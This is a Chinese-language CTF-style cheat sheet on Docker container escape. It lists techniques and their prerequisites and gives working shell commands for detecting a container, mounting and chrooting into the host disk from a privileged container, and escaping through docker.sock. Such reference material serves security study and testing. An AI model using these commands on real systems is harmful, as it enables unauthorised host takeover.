---
title: 容器逃逸 — 综合技术速查
category: cloud-security
tags: [docker, escape, privileged, cgroup, docker-sock, runc]
triggers: [docker escape, container escape, privileged container, docker.sock, release_agent, cgroup, runc, 2375, 容器逃逸, 特权容器, --privileged, cgroup v2, CVE-2022-0492, CVE-2019-5736, CVE-2019-14271, /.dockerenv, kubepods]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/cloud-security/容器逃逸.md]
---

## Summary

容器逃逸技术速查：Privileged 挂载逃逸、cgroup release_agent、Docker Socket 利用、runc CVE 等。

## Key Points

| 技术 | 最低要求 |
|------|----------|
| privileged 挂载逃逸 | root + `--privileged` |
| cgroup release_agent | root + 可写 cgroup v1 |
| Docker socket 利用 | 可访问 `/var/run/docker.sock` |
| Docker API 未授权 | 网络可达 2375 端口 |
| runC CVE-2019-5736 | root + Docker ≤ 18.09.2 |
| CVE-2022-0492 | 内核 < 5.16.2 |

## Details

### 检测容器环境

```bash
ls -la /.dockerenv
cat /proc/1/cgroup | grep -E 'docker|kubepods'
mount | grep '(ro' | grep -c cgroup  # 0 → privileged
ls /var/run/docker.sock 2>/dev/null
```

### Privileged 挂载逃逸

```bash
fdisk -l 2>/dev/null || lsblk
mkdir -p /mnt/host && mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
```

### Docker Socket 逃逸

```bash
docker run -v /:/host --privileged -it alpine chroot /host /bin/bash
```

## Connections

- GHSA: [[code-audit/ghsa-cloud-security]] (容器逃逸 CVE 索引)
